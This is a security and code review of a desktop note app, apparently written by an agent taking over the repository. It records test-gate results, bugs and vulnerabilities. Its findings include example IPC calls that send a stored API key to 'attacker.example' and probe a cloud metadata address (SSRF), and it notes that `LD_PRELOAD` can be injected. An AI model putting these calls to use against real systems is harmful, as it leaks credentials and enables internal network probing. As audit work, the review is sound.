# NekoWite — code review, 2026-09-21

Read at commit `4c1f36c` (`HEAD` == `origin/main`, working tree clean). Written by the agent taking the
repository over, after reading `docs/HANDOVER.md` end to end, `docs/DOC-AUDIT.md`'s index,
`docs/dev.md` §5–§7 and `docs/RELEASING.md`.

**The review itself changed no source file.** It wrote this document, some scratch (the pnpm/XDG
directories, a review-time `Xvfb` shim) and one temporary copy of the engine into `target/release/` —
all of it removed at the end, the engine copy because leaving it would make §9.1 pass for a reason
nobody chose. The command logs behind every reading below are kept at
`apps/desktop/src-tauri/target/review-2026-09-21/`, under the gitignored build directory.

> **What happened next.** Nine of these findings were then fixed, at the maintainer's instruction:
> `U1` (the care ledger's missing producer **and** its persistence), `F1`, `F2`, `F3`, `T1`, `S1` and
> `S2`. The changes, their red/green evidence and the final gate are in
> [`2026-09-21-fixes-applied.md`](2026-09-21-fixes-applied.md); the findings below are left as they
> were found, so the two documents can be read against each other. Two things in this file are now
> historical rather than current: the `git status` sentence just above (the tree carries the fixes),
> and §6's `T1`, whose fix is described there.

Where a finding was established by reading the code and the caller chain, it says **verified**; where
it came from a parallel reviewer and was not re-executed, it says **reported, not re-run**. Nothing
here is a guess about code that was not read.

---

## Summary

The handover is unusually accurate: every frontend number in its gate table reproduces, all three
instruments reproduce with their controls green, and its §9.1 root cause is correct. What it misses is
that **its own headline reading depends on a machine**, and that three of the repository's subsystems
ship without a producer or with a broken invariant.

| # | Finding | Kind | Severity |
|---|---|---|---|
| T1 | A skipped process-level test is reported as **passed**; `cargo test` green can mean "it never ran". Xvfb is spawned without `-extension GLX`, which segfaults on this host | gate | **high** |
| U1 | The care ledger has **no producer**; `desktop_pet_care_read` can only ever answer `Empty`. XP, streak and badges cannot accrue | unreachable | **high** |
| F1 | The autosave timer opens an unsolicited native **"Save as"** dialog over an untitled note while you type | bug | **high** |
| F2 | A refused `agent_load_session` leaves `adopting` set; that session's next turn is stuck `Running` for ever | bug | **high** |
| F3 | The AI master switch does not gate model-list requests, and `ai-gate`'s contract says it does | bug + doc | **high** |
| S1 | A caller-supplied `base_url` decides where the **stored API key** is sent | security | **high** |
| S2 | `allow_private` defaults to `true` and waives the SSRF guard from inside the request | security | **high** |
| F4 | A pet window closed by the compositor wedges the whole pet window surface | bug | medium |
| F5 | A fresh install puts the pet on screen, and `lib.rs` says it cannot | bug + doc | medium |
| S4 | `import_attachment` reads any image-named file the renderer names | security | medium |
| S5–S7 | Credential env-var injection, an unrecoverable key-rotation window, a mode reported but not enforced | security | medium |
| F6–F11 | Partial-failure visibility, silent lock poisoning, unhandled rejection, dropped warnings | bug | low–medium |
| D1–D11 | Stale comments and counts, including the two that hid F3 | doc | low |

Two readings worth stating plainly, because they are the ones a new team needs first:

- **The Rust suite is not broken — it is green: 73 of 73 targets, 1330 passed, 0 failed, exit 0**
  (§1.4). The suite's problem is that it could not tell anyone it had run.
- **The frontend gate is green and honest about its numbers** (0 errors / 462 warnings, and the 462
  are real). Nothing here contradicts the handover's §4.5.

---

## 0. How to reproduce any of this

```bash
# pnpm needs its store database outside the sandbox; keep its XDG dirs inside the tree
export XDG_DATA_HOME=$PWD/.tmp-review-pnpm/data XDG_CACHE_HOME=$PWD/.tmp-review-pnpm/cache \
       XDG_STATE_HOME=$PWD/.tmp-review-pnpm/state

pnpm typecheck && pnpm lint && pnpm test && pnpm perf && pnpm build
python3 scripts/check-reachability.py
python3 scripts/check-dead-exports.py
python3 scripts/check-channels.py
```

Raw output from the session (gate, instruments, both Rust test runs, the full `--no-fail-fast` suite)
is kept at `apps/desktop/src-tauri/target/review-2026-09-21/`.

---

## 1. The gate, re-measured

### 1.1 The frontend gate is green, and its numbers match the handover

| Command | Result (measured 2026-09-21, load average ~22) |
|---|---|
| `pnpm typecheck` | exit 0 |
| `pnpm lint` | exit 0 — **0 errors, 462 warnings** |
| `pnpm test` | exit 0 — editor-core **959 / 73 files**, plugin-host **132 / 10**, desktop **4774 / 400** |
| `pnpm perf` | exit 0 — 10 tests in 2 files |
| `pnpm --filter @nekowite/desktop build` | exit 0 (handover's reading; not re-run separately) |

`docs/HANDOVER.md` §4.5 is accurate on every row it states, including the 462 warnings.

**Re-confirmed after this review's only write** (a markdown file, no source): `pnpm typecheck` exit 0,
`pnpm lint` exit 0 — 0 errors, 462 warnings, `pnpm test` exit 0 — 400 files / 4774 tests,
`pnpm perf` exit 0 — 2 files / 10 tests. Log: `target/review-2026-09-21/gate-confirm.log`.

**One line in that output is not a failure but reads like one.** `pnpm test` prints, six times:

```text
[NekoWite:governance] failed to persist plugin audit log TypeError: Cannot read properties of undefined (reading 'then')
    at Object.write (apps/desktop/src/features/plugins/services/audit-log.ts:70)
    at flushAuditLogToFile (packages/plugin-host/src/audit-log.ts:208)
```

It is a best-effort sink whose injected writer returns `undefined` in that spec's environment. It is
swallowed by design (`vault-plugin-load.ts:351` `void flushAuditLogToFile()`), so it cannot fail the
run — but a maintainer grepping the gate output for `rror` finds it and has no way to tell noise from
signal. Worth a one-line note in the handover's gate table.

### 1.2 Three of the four instruments reproduce exactly

`scripts/boot-probe.sh` was **not** run: it starts the packaged binary under `xvfb-run`, and Xvfb
segfaults on this host before it can serve a display (§1.3). That is a limitation of this reading, not
a negative result — §7.4's claim that the packaged pair survives startup stands unverified here.

- `scripts/check-reachability.py` — controls all `True`, **739 of 1223** modules walked, **505**
  unreachable, "specifiers that resolve to nothing: none". Matches §7.1.
- `scripts/check-channels.py` — **21 channels emitted by Rust, 0 unwired**; 1 of 8 listened channels
  has no Rust emitter. Matches §7.3.
- `scripts/check-dead-exports.py` — **86 of 1326** exported functions, 122 more called inside their own
  file. Matches §7.2.

### 1.3 `cargo test` — the handover's §9.1 is real, but it is not what the command says

Two runs of the same test, same tree, same binary:

```bash
cd apps/desktop/src-tauri
cargo test --locked --test agent_exit_teardown_test -- --nocapture
```

**Run A (as written) — exit 0, "1 passed":**

```text
timed out waiting for this case's own display      (x20)
skipping: an X server of this test's own could not be started
test a_graceful_quit_takes_the_engine_with_it ... ok
test result: ok. 1 passed; 0 failed; ... finished in 102.50s
```

**Run B (with `-extension GLX` injected into the Xvfb command line) — exit 101, FAILED:**

```text
t+1.6s: the main window is up (1280x820 at 160,90); 2 window(s) in all
t+4.1s: the vault is open and registered; the pet is off, so the main window is the last one
timed out waiting for the engine to start
panicked at tests/agent_exit_teardown_test.rs:911: no engine appeared after the rail was opened
test result: FAILED. 0 passed; 1 failed; ...
```

**So both of these are true at once, and the handover states only the second:**

1. §9.1's diagnosis is **confirmed**: `target/release/opencode` is absent,
   `target/release/nekowite` exists and is the packaged binary (36,891,600 bytes, same size and
   timestamp as `release/nekowite_1.0.0_x64`), and the test fails on exactly the timeout §9.1 quotes.
2. On this machine the *same command* exits **0** and reports the test as passed — because
   `PrivateDisplay::start` could not start a display and the test takes the skip path as a `return`.

The cause of the display failure is a shim-sized thing: `Xvfb` segfaults on this host when it
initialises GLX/EGL.

```text
$ Xvfb :78 -screen 0 800x600x24 -nolisten tcp
(EE) Backtrace: ... libEGL_nvidia.so.0 ... swrast_dri.so ... Xvfb
(EE) Caught signal 11 (Segmentation fault). Server aborting

$ Xvfb :80 -screen 0 800x600x24 -nolisten tcp -extension GLX
$ DISPLAY=:80 xdotool getdisplaygeometry
800 600
```

`apps/desktop/src-tauri/tests/agent_exit_teardown_test.rs:340` and
`.../main_window_close_pet_test.rs:180` both spawn `Xvfb <name> -screen 0 <SCREEN> -nolisten tcp`.

**This is the repository's own finding T1 — see §6.**

### 1.4 The full Rust suite is green — the reading §9.1a says has never been taken

```bash
cd apps/desktop/src-tauri
PATH="<a directory holding an Xvfb wrapper that appends -extension GLX>:$PATH" \
  cargo test --locked --no-fail-fast
```

The engine was staged at `target/release/opencode` (copied from the already-verified
`binaries/opencode-x86_64-unknown-linux-gnu`, byte-identical, and **removed again** at the end of the
session), and the GLX shim was in `PATH`. Everything ran:

| | |
|---|---|
| **exit code** | **0** |
| integration targets executed | **73 of 73** (plus 2 unit targets and the doc-tests = 76 result blocks) |
| tests | **1330 passed, 0 failed, 5 ignored** |
| skipped (`skipping:`) | **none** |

The 5 ignored tests are deliberate and each states its cost
(`a_failed_swap_keeps_the_backup_that_opens_the_snapshot ... ignored, three real Stronghold opens:
~3 minutes in debug`). Both process-level tests really ran this time —
`a_graceful_quit_takes_the_engine_with_it ... ok` and
`closing_the_main_window_takes_the_pet_and_the_process_with_it ... ok`.

**So §9.1a's worst reading is now answered, and the answer is reassuring in one direction and
damning in another.** Reassuring: there is no hidden pile of broken targets behind the fifth
alphabetical one — the other 68 are green. Damning: the entire Rust suite was green *except* for one
environmental precondition, and the gate that was supposed to say so reported `ok` and exit 0
(§1.3, T1). The suite's real content was never the problem; its ability to tell you it ran was.

*(Method note, in the spirit of the handover's §6.2: the first version of this command was spelled
`... 2>&1 > file`, which sends stderr to the terminal and stdout to the file — the same redirection
ordering trap. The result lines landed in the log and the `Running tests/...` lines landed in the job
output; both readings were kept and they agree at 76 targets. The command above is the corrected
spelling.)*

---

## 2. Functional defects

### F1 — The autosave timer opens an unsolicited native "Save as" dialog while you type · **verified**

**High.** A new, never-saved note is autosaved like any other, and the autosave path is the one path
that may not open a dialog — a rule the repository states three times and this call site does not
follow.

Chain, every link read:

| Step | Where |
|---|---|
| `+` in the tab bar creates a tab with `path: null` | `apps/desktop/src/ui/TabBar.vue:166` → `stores/tab-lifecycle.ts` |
| An edit marks it dirty and arms the timer | `features/editor/controller/editor-persistence.ts:148-151` |
| The timer's **only** guard is dirtiness | `stores/tab-persistence.ts:105-106` — `if (tab && tab.dirty) void saveTab(id)` |
| No path ⇒ open the file picker, unconditionally | `stores/tab-save.ts:150-153` |

```ts
// stores/tab-persistence.ts
const tab = tabs.value.find((x) => x.id === id)
if (tab && tab.dirty) void saveTab(id)
```

```ts
// stores/tab-save.ts:150
if (!path) {
  // Untitled tab: an explicit save means "save as", not a silent no-op.
  const picked = await files.saveFileDialog('untitled.md', vault.value)
```

The comment says *explicit*; nothing here tests whether the save was explicit. `TabSaveOptions`
carries exactly that flag (`tab-save.ts:82-84` `offerCopy`, `:92-93` `userAsked`) and the branch
ignores both.

The rule it breaks is written down twice:

- `stores/tab-settle.ts:57-63` — "Untitled tabs are skipped: with no path they would need a save-as
  dialog, which a background/bulk flush must not open".
- `stores/tab-save.ts:70-77` — "`saveTab` is also the autosave's, the window-blur save's and the bulk
  flush's entry point, and none of those may put a file dialog in front of the user mid-keystroke".

**Reproduction:** press `+`, type a sentence, stop typing. `autosaveInterval` defaults to 15 000 ms
(`stores/settings-editor.ts:36`, `readAutosaveInterval(15000)`) and every keystroke re-arms the timer,
so the dialog returns after each pause until it is answered. `flushDirty()` honours the rule; the
timer does not.

**Fix direction:** guard the untitled branch on `opts.userAsked` (or on `opts.offerCopy` for the
close-path rescue) and let a background save of an untitled tab return `false` without picking.
`stores/tab-persistence.test.ts` has no case with a path-less tab, which is why it never went red.

### F2 — A refused `agent_load_session` freezes that session's run state forever · **verified**

**High.** The adoption flag is set before a fallible await and cleared only on success.

```rust
// apps/desktop/src-tauri/src/commands/agent_sessions.rs:185
session.snapshots.adopting(&session_id);
let info = session
    .runtime
    .load_session(&session_id, &root)
    .await
    .map_err(|error| AgentFailure::of_session(&error))?;   // <- returns past the clear
session.snapshots.opened(&info.session_id);                  // :194 — the only clearer
```

`adopting` is cleared by `SessionSnapshots::opened` and by nothing else
(`agent_runtime/snapshot.rs:200-203`; the only other caller is `commands/agent.rs:500`, the
new-session path). `load_session` refuses an already-registered session with `AlreadyOpen`
(`agent_runtime/session.rs:661-667`) and a transport failure removes the registration but leaves the
snapshot log `adopting()` created.

What the leak then costs: `started()` sets `run_id` and clears `ended` **without consulting
`adopting`** (`snapshot.rs:238-243`), while `record()` skips every `RunFinished` frame behind
`if !log.adopting` (`snapshot.rs:262`). The state table then answers `Running` for good:

```rust
// snapshot.rs:369
(true, None) => SessionState::Running,
```

**Reproduction:** a session the runtime serves but the window does not show — a state the gateway
documents as real (`platform/gateways/agent-contracts/gateway.ts:521-527`: "a session the runtime is
*already serving but not showing*: `loadSession` refuses it (already open)") — is clicked in the
history list. `agent-rail.ts:308` only early-returns when the session is already *shown*, so `load()`
proceeds, the backend answers `AlreadyOpen`, and `onResumeFailed` runs. The next prompt on that
session is recorded with `adopting` still true; the conversation then draws a spinner over a finished
turn and refuses to send — the exact failure `adopting` was written to prevent.

**Fix direction:** clear the flag on the failure path (a guard, or `opened` in a `Drop`/`finally`
shape), and clear it in `started()` so a turn can never begin inside an adoption.

### F3 — The AI master switch does not stop a model-list request, and `ai-gate`'s contract says it does · **verified**

**High** for the contract; the request itself carries an endpoint and a credential and no document.

`apps/desktop/src/features/ai/services/ai-gate.ts:35-40`:

> True when the user switched AI off outright: **no request may leave the app**, which is the only
> thing that also stops the document being sent away.

The model-list path never consults it:

```text
AiSettings.vue:98-103  (刷新 button)                     ─┐
use-ai-settings.ts:152-158 (watch on the provider)      ─┼─→ refreshModels()
AgentProviderAuthoring.vue (获取模型)                    ─┘        │
                                                                  ▼
use-ai-settings.ts:126  await settings.listModels()
stores/settings-ai.ts:239-241  getSharedGateways().ai.listModels(config())
platform/gateways/tauri.ts:85  invoke('ai_list_models', { config })
commands/ai.rs:31  hydrate_stored_key(&app, &mut config)?  // backfills the vault key
```

`config()` omits `api_key` whenever the settings field is empty — which is what a *configured*
provider looks like, by design (`AiSettings.vue:53-58`) — so the Rust side fills it in from the key
vault and the request authenticates with the stored credential
(`providers/ai/config.rs:140-152`, `request.rs:203-223` / `:295-309`).

**Reachability, settled (the handover asked for exactly this):** with AI switched off in
Settings → AI, (a) changing the provider dropdown fires the watcher and issues the request, (b)
pressing 刷新模型列表 issues it, (c) the agent settings provider form's 获取模型 issues it with the
typed key. **No path fetches without a user gesture** — the watcher has no `immediate: true` and
`AiSettings.vue` is `v-if`-mounted only while its section is shown
(`SettingsPanel.vue:250-252`) — so the "fetch on mount" hypothesis is refuted.

**Fix direction:** one `aiDisabled()` check inside the gateway's `listModels`, which is the single
place all three callers pass through, or in `stores/settings-ai.ts:239`. The same gate belongs on
`ai_list_models` in Rust if the renderer is not trusted (§S1).

### F4 — A pet window closed by the compositor wedges the whole pet surface · **verified (code path)**

`lib.rs:427-433` is the only `WindowEvent::Destroyed` arm in the crate, and it filters on the main
window:

```rust
if label == crate::main_window::LABEL {
```

A `pet-*` window destroyed from outside (Alt+F4, a session manager, a compositor) leaves its label in
`PetWindowHost::instances`. From then on `TauriSurfaces::window` fails for that label
(`desktop_pet/window_host.rs:929-934`), `close_characters` re-pushes it forever, `set_visible` aborts
at the first stale label (`window_host.rs:771-782`) so *no* window can be hidden or shown again, a cap
slot is lost, and `enabled` keeps answering `true` from a non-empty instance list
(`commands/desktop_pet.rs:195`).

**Reachability:** the trigger is an external close — no pet capability grants `core:window:allow-close`
or `allow-destroy`, and the frontend only ever uses `getCurrentWindow()`. **Confidence: certain for the
code path, needs-runtime-check for the trigger.** Falsified by an arm elsewhere that prunes
`instances`, or by a destroy route for `pet-*` that goes through the host.

### F5 — A fresh install puts the pet on screen, and `lib.rs` says it cannot · **verified**

`lib.rs:207-209`:

> What it does *not* do is build a window: §7.1 makes the pet window 按需创建, so this installs the
> thing that can open one and **nothing is on screen until a settings page asks**.

`app.manage(state::DesktopPetState::new(app.handle()))` (`lib.rs:215`) ends in
`restore_switch` (`state/desktop_pet_state.rs:175-186`) → `feature_switch::restore`
(`desktop_pet/feature_switch.rs:149-178`) → `apply` → `open_selected` + `ensure_ball`
(`feature_switch.rs:119-142`). Both window switches default **on**:

```rust
// desktop_pet/settings/fields.rs:143-144, :156-157
Field { name: "ball", kind: Kind::Bool(true) },
Field { name: "characterWindow", kind: Kind::Bool(true) },
```

The config-window loop that builds `main` runs *after* this (`lib.rs:224-226`). So the first launch of
a clean profile shows a character window and a floating ball on the desktop before the editor exists,
with no user action and nothing in `README.md`/`USER-GUIDE.md` to say it will. This is both a stale
comment (a defect by this repository's own rule, §5.2) and the sharpest form of the product question
§9.6 raises.

### F6 — `set_visible` leaves the flag and the ball inconsistent after a partial failure · **verified**

`desktop_pet/window_host.rs:782-788`: the per-window call uses `?` inside the loop, and
`self.visible = visible` (and `self.ball.set_visible`, line 785) come after it. If window 2 of 3
refuses, window 1 is already hidden, the error propagates, `self.visible` is unchanged and the ball is
never asked — so `PetFeatureState::visible` (`commands/desktop_pet.rs:198`) reports `true` for a
partly hidden pet. `set_always_on_top`/`set_character_size` deliberately finish the loop; this one
does not.

### F7 — `AgentIpcState::install`/`clear` swallow a poisoned lock, unlike every read of the same slot · **verified**

```rust
// commands/agent.rs:159-170 — reports poisoning
self.session.lock().map_err(|_| AgentFailure::unavailable("... poisoned by a panic"))?
// commands/agent.rs:173-177 — silent
pub fn install(&self, session: Session) {
    if let Ok(mut slot) = self.session.lock() { *slot = Some(session); }
}
// commands/agent.rs:181-183 — silent, returns None
pub fn clear(&self) -> Option<Session> { self.session.lock().ok().and_then(|mut slot| slot.take()) }
```

After a panic while that lock is held, `agent_start` answers a handle and an epoch while nothing is
installed, and every later command says "no agent session is running". A `clear()` that returns `None`
also skips `permissions.revoke_all()` and the pet retire inside `stop_running_engine`
(`agent.rs:437-452`). The critical section is tiny, so poisoning is unlikely — but the asymmetry is
the defect: five readers refuse loudly and the two writers fail soft.

### F8 — The palette's file-watch subscription has no rejection path · **verified (asymmetry)**

`features/palette/composables/use-palette-entries.ts:158-167`:

```ts
onMounted(() => {
  fsUnlisten = fsService.onFsChange(() => { vaultFileIndex.invalidate(); ... })
})
onBeforeUnmount(() => { void fsUnlisten?.then((unlisten) => unlisten()) })
```

No `.catch`. The sibling that makes the same call guards it, with a comment naming the case
(`features/graph/composables/use-note-graph.ts:237-243`). `onFsChange` is Tauri `listen`, which
rejects when registration fails; on that path the palette never invalidates its cached walk and an
open list keeps offering files that are gone, with nothing reported.

### F9 — A delegated agent write drops the "no history snapshot" warning · **reported, not re-run**

`agent_runtime/fs_capability.rs:425` destructures `Ok(Ok((baseline, _warning, content)))`; the port's
own contract at `:151-153` and the recovery path (`agent_runtime/recovery.rs:308-321`, surfaced at
`commands/agent_recovery.rs:63-68`) both carry that warning. A write that landed without a history
snapshot is therefore indistinguishable from one that landed with one.

### F10 — `hasActiveTab` means "has text", so an open empty note cannot be exported · **reported, not re-run**

`features/settings/composables/use-export-settings.ts:30-31` documents "whether a note is open";
`:85` is `!!tabs.activeTab?.content`, and `ExportSettings.vue:66` disables every export control from
it. Documented/implemented mismatch, low impact.

### F11 — Plugin on/off switches can report a state the app does not hold · **reported, not re-run**

`features/plugins/services/vault-plugin-registry.ts:137-141` swallows a failed reload
(`.catch(() => undefined)`) while the row is re-read from the in-memory record, and
`features/plugins/services/governance-store.ts:289-307` swallows a failed persistence write. A toggle
can read as applied, run nothing, and revert at the next launch.

---

## 3. Security

The repository's own threat model treats the main-window renderer as untrusted
(`state/vault_confinement.rs:34-37`, `providers/ai/limits.rs:19-24`) "because anything can invoke the
command". The three findings below are in-model on that basis.

### S1 — A caller-supplied `base_url` decides where the stored API key is sent · **verified**

```rust
// providers/ai/config.rs:140-152
config.api_key = None;
if let Some(stored) = load_stored(&config.provider)? { config.api_key = Some(stored); }
```

`load_stored` is keyed by `config.provider` alone; nothing binds the hydrated key to an approved
base URL, and there is no Rust-side AI settings store to bind it to. `validate_base_url` then approves
whatever host the same payload named, and `with_completion_auth`/`models_headers`
(`request.rs:295-309`, `:203-223`) attach the key as `Authorization: Bearer …` / `x-api-key` /
`x-goog-api-key`.

```js
ai_complete({ config: { provider: "openai", model: "gpt-4o",
                        base_url: "https://attacker.example/v1", api_key: null },
              prompt: "x", images: [], id: null })
```

sends the user's stored OpenAI key to `attacker.example`. `keys.rs`'s promise — "never exposed over
IPC — it is the sole path that yields the real key" (`storage/key_store.rs:222`) — is true literally
and defeated here: the key leaves through the socket instead of through the command's return value.

**Fix direction:** never backfill a vault key into a caller-supplied `base_url`; bind
key ↔ provider ↔ endpoint (a stored, user-approved base URL, or refuse the backfill when
`config.base_url` disagrees with the stored one).

### S2 — The SSRF guard is waived by a field of the same request, and the shipped default waives it · **verified**

```rust
// providers/ai/url_policy.rs:39-49
if cfg.allow_private {
    let url = parse_base_url(base)?;
    reject_plaintext_public_url(&url, base)?;
    return Ok(None);          // no private-range check, and no address pin
}
```

`allow_private` is a field of the request DTO, and the frontend sets it from a setting that defaults
to `true` (`stores/settings-ai.ts:134` `readBool(LS_ALLOW_PRIVATE, true)`), forwarded on every
request (`config()` line 234 `cfg.allow_private = allowPrivate.value`). The comment at
`url_policy.rs:115` justifies the waiver as being "for a host the user explicitly opted into" — the
code cannot tell an opt-in from an argument. Pinning is skipped on that branch too, so the
DNS-rebinding protection `VettedHost` exists for (`url_policy.rs:117-127`) does not apply.

```js
ai_list_models({ config: { provider: "local", base_url: "http://169.254.169.254/latest/meta-data/",
                           allow_private: true } })
```

reaches link-local/loopback/LAN addresses, and the answer comes back — a matching body as the model
list (`providers/ai/model_list.rs:129-137`), anything else as a body preview inside the error
(`model_list/diagnosis.rs:106-124`). One call per port is a probe primitive.

### S3 — Proxy credentials are copied into data returned to the window · **reported, not re-run**

`providers/ai/model_list/diagnosis.rs:70-83` reads `HTTPS_PROXY`/`ALL_PROXY`/… and `:88-93` embeds the
value verbatim in the returned error, userinfo and all. The renderer cannot read the process
environment itself; this hands it `http://user:pass@proxy:8080`. Stripping userinfo costs one line.

### S4 — `import_attachment` is a caller-driven read of any image-named file · **verified**

`commands/fs.rs:269-281` takes `source_path` from the renderer and passes it to
`storage/attachment_store.rs:68-115`, whose filter is `is_importable_image` — **the path's extension
only** (`attachment_store.rs:48-53`). The bytes are copied into the vault and are then readable by the
window through `resolve_media_path` → `asset://` (`commands/fs.rs:616-635`). Nothing binds
`source_path` to a previous `pick_image_files` result; the backend never sees that dialog.

The module comment states the trade-off deliberately (`attachment_store.rs:64-67`: "The source path is
intentionally outside the vault … so it is NOT passed through `resolve_within`"), and the destination
side is properly confined. What is missing is the other half: a one-shot token minted by
`pick_image_files` and required by `import_attachment` would close it without costing the IPC hop the
comment is protecting.

### S5 — `agent_credentials_write` accepts any environment-variable name, injected last · **reported, not re-run**

`commands/agent_settings.rs:484-491` → `agent_runtime/profile.rs:916-923`, with
`is_variable_name` (`profile.rs:1015-1017`) checking only execve's shape rule. `registry.rs:381-382`
extends the spawn environment with the credentials *after* the profile-isolation roots, so
`LD_PRELOAD`, `OPENCODE_CONFIG_DIR`, `HOME`, `XDG_*` set through the credentials surface win.
`environment.rs:180-208` records as *measured* that a mis-set `OPENCODE_CONFIG_DIR` stops the app's
shipped permission block from being applied — i.e. this path can turn the consent gate off. The
command is granted to `main` in `capabilities/default.json`. **Confidence: certain for the ordering
and the name rule; the `LD_PRELOAD` half needs a runtime check.** Fix: an allowlist of credential
names, and placing credentials before the isolation entries.

### S6 — A crash in one window of the passwordless→password change is unrecoverable · **reported, not re-run**

`domain/recovery.rs:226-228` ("a crash at ANY point loses no stored key") and `:241-243` ("exactly
the state the load-time fallback recovers from"). After the step-4 rename, `master.key` holds
`Locked` while `master.key.old` holds the `Auto` key that opens the live snapshot. `open_vault`
returns early on `Locked` (`storage/key_store.rs:120-148`, `storage/key_file_store.rs:282-287`) so the
backup search never runs while `master.key` exists, and `password_candidates` deliberately skips
passwordless backups (`commands/keys.rs:275-282`). The user is told "incorrect master password" over a
vault whose key is sitting in `master.key.old`. Hand recovery exists (`key_file_store.rs:321-332`) and
nothing says so. `Locked→Locked` does recover via the old password; the failure is specific to the
`Auto→Locked` direction.

### S7 — The credentials file's mode is reported as 0600 without being enforced · **reported, not re-run**

`agent_runtime/profile.rs:856-864` reports `mode: config_edit::DOCUMENT_MODE` → `"600"`
(`commands/agent_settings.rs:411-422`), while the writer preserves whatever mode the file already has
(`config_edit.rs:540-542` `map_or(DOCUMENT_MODE, |meta| meta.permissions().mode() & 0o777)`). Nothing
on that path calls `set_permissions` (only `binary_registry.rs:582` and `update.rs:365` do). A 0644
file restored from a backup stays 0644 while the settings page says otherwise.

---

## 4. Unreachable code — the pattern this repository names, found again

`docs/HANDOVER.md` §6.7 gives the failure mode a name and §7 gives it instruments. Three more
instances, none of them on the §9 work list:

### U1 — The care ledger has no producer; `desktop_pet_care_read` can only answer `Empty` · **verified**

```rust
// desktop_pet/care_ledger.rs:2 — the module's own claim
* The care ledger: what a verified completion paid, and the record that it paid once.
```

Exhaustive search over the crate (`grep -rn "settle("` and `"CareEvent"` across `src/` and `tests/`):

- `CareLedger::settle` (`care_ledger.rs:388`) — **called only from tests**
  (`tests/desktop_pet_care_test/*.rs`, `tests/desktop_pet_ipc_test/commands.rs:576`).
- `CareLedger::import` (`care_ledger/import.rs:117`) — **no caller at all**, in `src` or in tests.
- `CareEvent` — never constructed under `src/`.
- The one reader returns early on an untouched ledger:
  `commands/desktop_pet.rs:413` `if ledger.revision() == 0 { return Ok(PetCareRead::Empty); }`.

So XP, meals, the streak, the 14-day window and the night-owl badge can never accrue in the shipped
app, while the module header, the command's own doc ("the ledger's own settlement path",
`commands/desktop_pet.rs:391-393`) and the whole `pet-care-rules.ts` level curve describe a feature
that runs. `module_tree_test.rs` cannot see this: the module *is* declared — it is the producer that
is missing. This is the largest functional gap in the repository that `docs/HANDOVER.md` §9 does not
list.

### U2 — Two more production-dead exports beside the three §9.2 names · **verified**

`scripts/check-dead-exports.py` reports `spec=0` for `services/export.ts:193` `imageMime` and
`features/agent/services/agent-composer-attachments.ts:75` `featureFor` — nothing calls them,
including their own specs. §9.2 names only `buildLinkGraph`, `findBrokenLinks` and
`createTauriPetGateway`. The instrument already finds these; the handover's list of "confirmed
superseded" entries is short by two, and `imageMime` is a plausible cause of an export-path bug rather
than harmless.

### U3 — `main_window::raise`'s rebuild path still has no test · **confirmed, as §9.4 states**

The seven references to the deleted `tests/main_window_relaunch_test.rs` are exactly where §9.4 says
they are (`main_window_test.rs:13`, `main_window_close_pet_test.rs:60,65`,
`agent_exit_teardown_test.rs:30,36,131,675`). `main_window.rs` itself reads soundly — `raise` builds
through the same `build()` as `setup`, so `enable_clipboard_access` cannot drift — but nothing drives
the rebuild.

---

## 5. Documentation and comment defects

Stale comments are defects in this repository (§5.2 of the handover). These are ones that would
actively mislead a new maintainer, in descending order of how much time they cost.

| # | Where | What it says | What is true |
|---|---|---|---|
| D1 | `src-tauri/build.rs:21` | main holds "all **eighty-two** below" | `COMMANDS` has **84** entries; `lib.rs` registers exactly the same 84 (parsed both lists) |
| D2 | `src-tauri/src/lib.rs:373` | "the pet window holds **eight**" | `capabilities/desktop-pet.json` grants **nine**; `build.rs:22` and the capability file's own comment both say nine |
| D3 | `commands/fs.rs:219` | `register_vault` is "the command that authorizes the root and **extends the asset scope**" | `register_vault` (`fs.rs:173-185`) never touches the scope — and `fs.rs:122` in the same file says `resolve_media_path` "is also the **only** thing that ever extends the asset scope" |
| D4 | `agent_runtime/acp_transport.rs:109-110` | `connect` "spawns the engine and **completes its side of the ACP handshake**" | it sends nothing; `initialize` is issued by `session.rs:468`/`update.rs:523`, and `commands/agent_runtime.rs:112-117` states the truth |
| D5 | `apps/desktop/src/i18n/namespaces/attachments.ts:30` | images are "自动保存到 vault 的 **attachments** 目录" | `services/rename-asset.ts:42,62` writes `<notedir>/<notename>_assets/`; only the library lists `ATTACHMENTS_DIR`. A **user-visible** wrong statement, and the same one `docs/PRIVACY.md:32` repeats |
| D6 | `apps/desktop/src/features/ai/services/ai-gate.ts:4-6` | "the only place the AI permission state is read" | `services/plugin-ai.ts:42-51` and `composables/use-ghost-writer-shortcut.ts:59-66` read the store directly — and that absent choke point is what let **F3** through |
| D7 | `apps/desktop/src/app/vault-switch.ts:226` | `notifyError(\`could not open the vault (missing/permission): ${path}\`)` | hard-coded English in a Chinese UI, while every neighbour in the same function uses `t(...)` (`:168`, `:203`) |
| D8 | `apps/desktop/src/features/settings/composables/use-export-settings.ts:30-31` | `hasActiveTab` = "whether a note is open" | `:85` is `!!tabs.activeTab?.content` — see **F10** |
| D9 | `commands/desktop_pet.rs:13-16` | "app commands are **not ACL-gated at all**" | `build.rs` defines an app manifest (`AppManifest::new().commands(COMMANDS)`), and `capabilities/desktop-pet.json` grants nine `allow-desktop_pet_*` app-command permissions. The same bullet contradicts itself a clause later |
| D10 | `desktop_pet/window_host.rs:13` / `commands/desktop_pet.rs:251` | "a label never leaves this module" / "the only place a label is handed outward" | labels are serialized out by `desktop_pet_windows`, `desktop_pet_open` and `desktop_pet_close_own`; and pet windows invoke nine commands, not one. The real property (no command *accepts* a label) does hold |
| D11 | `desktop_pet/ball.rs:47-48` | `desktop-pet-ball.json` "narrows what this one window may do" | Tauri unions capabilities by label glob, and `pet-ball` matches `pet-*`; the ball file's own description calls its grant "a **subset** … rather than a widening" |

---

## 6. The test gate itself

### T1 — A skipped process-level test is reported as **passed**, so `cargo test` green can mean "it never ran" · **verified**

Rust has no skip. A test that returns early is `ok`. In this file six conditions skip
(`agent_exit_teardown_test.rs:771,775,779,788,792,796`; `main_window_close_pet_test.rs` has five of
the same), and the most important ones are "there is no packaged build to drive" and "an X server of
this test's own could not be started". Measured consequence (§1.3):

```text
skipping: an X server of this test's own could not be started
test a_graceful_quit_takes_the_engine_with_it ... ok
test result: ok. 1 passed; 0 failed
```

Exit 0. The gate cannot tell "the quit took the engine with it" from "this case never ran".
Four targets use this pattern (`agent_exit_teardown_test`, `main_window_close_pet_test`,
`instance_guard_test`, `fs_test`).

This matters more than the missing engine in §9.1, because §9.1 is *visible* — the failure prints —
while a disabled instrument is not. The handover's own §7 rule ("if a control reads False the run is
blind, not clean — say so rather than reporting the orphan list") was applied to the four scripts and
not to the two test targets.

